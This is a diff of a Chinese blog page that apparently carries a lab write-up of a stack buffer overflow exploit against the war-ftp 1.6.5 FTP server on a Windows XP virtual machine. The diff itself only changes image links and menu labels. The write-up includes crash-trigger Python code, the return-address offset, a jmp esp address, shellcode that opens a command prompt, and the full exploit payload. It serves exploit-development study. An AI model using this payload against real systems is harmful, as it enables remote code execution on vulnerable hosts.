@@ -109,35 +109,35 @@
 			
 					<h2 id="一-漏洞分析"><a href="#一-漏洞分析" class="headerlink" title="一 漏洞分析"></a>一 漏洞分析</h2><h3 id="1-1-验证漏洞"><a href="#1-1-验证漏洞" class="headerlink" title="1.1 验证漏洞"></a>1.1 验证漏洞</h3><p>在Windows XP虚拟机中，使用OllyDbg装载war-ftp1.6.5，并运行程序。允许匿名登录FTP。</p>
 <a id="more"></a>
-<p>图1是正常情况下系统的界面：<img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%2010.35.17%20AM.png" alt="Screen Shot 2019-04-24 at 10.35.17 AM"></p>
+<p>图1是正常情况下系统的界面：<img src="https://tva1.sinaimg.cn/large/0081Kckwly1gk600zhm9tj313a0u013s.jpg" alt="Screen Shot 2019-04-24 at 10.35.17 AM"></p>
 <center>图1. 正常界面</center>
 
 <p>利用python代码来验证漏洞：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP </span><br><span class="line">ftp = FTP(host=<span class="string">'10.211.55.9'</span>)</span><br><span class="line">user = <span class="string">'A'</span> * <span class="number">500</span></span><br><span class="line">ftp.login(user, <span class="string">'www'</span>)</span><br></pre></td></tr></table></figure>
 <p>发送登录请求后，系统还能够正常使用，状态无明显变化，因为warftp是多线程的。</p>
 <p>利用CDB进行调试，再次发送登录请求，当登录的用户名长度达到500个字节时，CDB能够捕捉到错误的信息。在调试器中，能够看到EIP指向了41414141（41为’A’的ASCII码）如图2所示：</p>
-<p><img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-23%20at%2011.14.47%20PM.png" alt="Screen Shot 2019-04-23 at 11.14.47 PM"></p>
+<p><img src="https://blog-pic-1253509660.cos.ap-beijing.myqcloud.com/blog/2020-10-29-024656.png" alt="Screen Shot 2019-04-23 at 11.14.47 PM"></p>
 <center>图2. 系统崩溃</center>
 
 <h3 id="1-2-定位溢出点地址"><a href="#1-2-定位溢出点地址" class="headerlink" title="1.2 定位溢出点地址"></a>1.2 定位溢出点地址</h3><p>利用PatternTool生成2000个不循环的字符串，作为用户名，向warftp发起请求，这里EIP被填充为32714131，执行patterntool，计算出RET的偏移量为485，如图3所示。由于EBP占4个字节，所以存放局部变量的缓冲区大小为481个字节。</p>
-<p><img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%209.48.05%20AM.png" alt="Screen Shot 2019-04-24 at 9.48.05 AM"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gk600z62iwj313a0u0apc.jpg" alt="Screen Shot 2019-04-24 at 9.48.05 AM"></p>
 <center>图3. 定位RET</center>
 
 <h3 id="1-3-寻找JMP指令地址"><a href="#1-3-寻找JMP指令地址" class="headerlink" title="1.3 寻找JMP指令地址"></a>1.3 寻找JMP指令地址</h3><p>希望通过在RET的位置放置<code>jmp esp</code>指令的地址，来实现程序的跳转。在Windows系统的许多DLL中都能找到这条指令，一个通用的地址是<strong>0x7ffa4512</strong>。</p>
 <p>因此继续来验证改地址的指令是否为<code>jmp esp</code>。如图4所示，可以看到地址为0x7ffa4512的指令的确为<code>jmp esp</code>。</p>
-<p><img src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%209.57.58%20AM.png" alt="Screen Shot 2019-04-24 at 9.57.58 AM"></p>
+<p><img src="https://tva1.sinaimg.cn/large/0081Kckwly1gk6010vfrfj313a0u0ant.jpg" alt="Screen Shot 2019-04-24 at 9.57.58 AM"></p>
 <center>图4. 验证指令地址</center>
 
 <h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二 漏洞利用"></a>二 漏洞利用</h2><h3 id="2-1-构造Shellcode"><a href="#2-1-构造Shellcode" class="headerlink" title="2.1 构造Shellcode"></a>2.1 构造Shellcode</h3><p>这里从metasploit上选择一个弹出命令行对话框的Shellcode。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">buf += "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45"</span><br><span class="line">buf += "\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6"</span><br><span class="line">buf += "\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78"</span><br><span class="line">buf += "\xC6\x45\xFE\x65\x6A\x01\x8D\x45\xF8\x50\xBA"</span><br><span class="line">buf += "\xad\x23\x86\x7c"</span><br><span class="line">buf += "\xFF\xD2\xC9"</span><br></pre></td></tr></table></figure>
 <h3 id="2-2-定位Shellcode存放位置"><a href="#2-2-定位Shellcode存放位置" class="headerlink" title="2.2 定位Shellcode存放位置"></a>2.2 定位Shellcode存放位置</h3><p>在程序崩溃时，查看ESP指向的内容为<strong>0x71413471</strong>，计算其偏移量为493。说明ESP指向字符串的第493个字节。因此，把Shellcode放在字符串的第493个字节。</p>
-<p><img src="/images/placeholder.png" alt="Screen Shot 2019-04-24 at 10.14.05 AM" data-src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%2010.15.11%20AM.png" class="lazyload"></p>
+<p><img src="/images/placeholder.png" alt="Screen Shot 2019-04-24 at 10.14.05 AM" data-src="https://tva1.sinaimg.cn/large/0081Kckwly1gk6011hnzfj313a0u0nam.jpg" class="lazyload"></p>
 <center>图5. 定位shellcode存放地址</center>
 
 <h3 id="2-3-完整Payload"><a href="#2-3-完整Payload" class="headerlink" title="2.3 完整Payload"></a>2.3 完整Payload</h3><p>在确定了Shellcode的存放位置，以及<code>jmp esp</code>指令的地址之后，继续来构造完整的Payload进行攻击。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">buf = 'A' * 485 + '\x12\x45\xfa\x7f' + 'B' * 4</span><br><span class="line">buf += "\x55\x8B\xEC\x33\xFF\x57\x83\xEC\x04\xC6\x45"</span><br><span class="line">buf += "\xF8\x63\xC6\x45\xF9\x6D\xC6\x45\xFA\x64\xC6"</span><br><span class="line">buf += "\x45\xFB\x2E\xC6\x45\xFC\x65\xC6\x45\xFD\x78"</span><br><span class="line">buf += "\xC6\x45\xFE\x65\x6A\x01\x8D\x45\xF8\x50\xBA"</span><br><span class="line">buf += "\xad\x23\x86\x7c"</span><br><span class="line">buf += "\xFF\xD2\xC9"</span><br></pre></td></tr></table></figure>
 <h3 id="2-4-攻击主机"><a href="#2-4-攻击主机" class="headerlink" title="2.4 攻击主机"></a>2.4 攻击主机</h3><p>编写攻击代码，向目标发送payload。可以看到成功弹出了命令行。说明攻击成功。</p>
-<p><img src="/images/placeholder.png" alt="Screen Shot 2019-04-24 at 10.30.59 AM" data-src="img_warftp漏洞利用实验/Screen%20Shot%202019-04-24%20at%2010.30.59%20AM.png" class="lazyload"></p>
+<p><img src="/images/placeholder.png" alt="Screen Shot 2019-04-24 at 10.30.59 AM" data-src="https://tva1.sinaimg.cn/large/0081Kckwly1gk6012c6qgj313a0u07by.jpg" class="lazyload"></p>
 <center>图6. 攻击成功</center>
 
   	
@@ -290,7 +290,7 @@
 	<div class="toc-container">
 			<div class="toc-sidebar">
 			<p class="toc-title">
-				Contents
+				CONTENT
 			</p>
 			<div class="toc-list">
 				<ol class="toc-inner"><li class="toc-inner-item toc-inner-level-2"><a class="toc-inner-link" href="#一-漏洞分析"><span class="toc-inner-text">一 漏洞分析</span></a><ol class="toc-inner-child"><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#1-1-验证漏洞"><span class="toc-inner-text">1.1 验证漏洞</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#1-2-定位溢出点地址"><span class="toc-inner-text">1.2 定位溢出点地址</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#1-3-寻找JMP指令地址"><span class="toc-inner-text">1.3 寻找JMP指令地址</span></a></li></ol></li><li class="toc-inner-item toc-inner-level-2"><a class="toc-inner-link" href="#二-漏洞利用"><span class="toc-inner-text">二 漏洞利用</span></a><ol class="toc-inner-child"><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#2-1-构造Shellcode"><span class="toc-inner-text">2.1 构造Shellcode</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#2-2-定位Shellcode存放位置"><span class="toc-inner-text">2.2 定位Shellcode存放位置</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#2-3-完整Payload"><span class="toc-inner-text">2.3 完整Payload</span></a></li><li class="toc-inner-item toc-inner-level-3"><a class="toc-inner-link" href="#2-4-攻击主机"><span class="toc-inner-text">2.4 攻击主机</span></a></li></ol></li></ol>
@@ -311,7 +311,7 @@
     
     <div class="search-container sildeUpMin">
         <div class="search-header">
-            <input type="text" placeholder="Typing Something here." id="search-input" class="search-input">
+            <input type="text" placeholder="输入你想搜索的" id="search-input" class="search-input">
             <span class="search-cancel">
                 <i class="iconfont icon-cancel">
             </i></span>
@@ -328,31 +328,31 @@
          
             
 
-            <a class="mobile-menu-link" href="/">Home
+            <a class="mobile-menu-link" href="/">首页
             </a>
             
          
             
 
-            <a class="mobile-menu-link" href="/archives">Archives
+            <a class="mobile-menu-link" href="/archives">归档
             </a>
             
          
             
 
-            <a class="mobile-menu-link" href="/tags">Tags
+            <a class="mobile-menu-link" href="/tags">标签
             </a>
             
          
             
 
-            <a class="mobile-menu-link" href="/about">About
+            <a class="mobile-menu-link" href="/about">关于
             </a>
             
          
                           
 
-            <a class="mobile-menu-link mobile-menu-search" href="#">Search </a>                 
+            <a class="mobile-menu-link mobile-menu-search" href="#">搜索 </a>                 
             
          
       
